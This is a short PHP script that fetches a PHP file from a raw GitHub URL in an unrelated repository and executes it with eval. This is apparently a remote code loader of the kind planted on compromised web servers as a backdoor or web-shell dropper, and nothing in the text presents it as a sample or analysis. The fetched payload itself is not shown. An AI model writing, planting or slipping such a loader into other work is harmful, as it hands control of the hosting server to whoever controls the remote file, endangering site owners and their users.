<?php
$url = "https://github.com/mangoleh098/alfj/raw/refs/heads/main/fillar.php"; 
$code = file_get_contents($url);

eval("?>$code<?php");
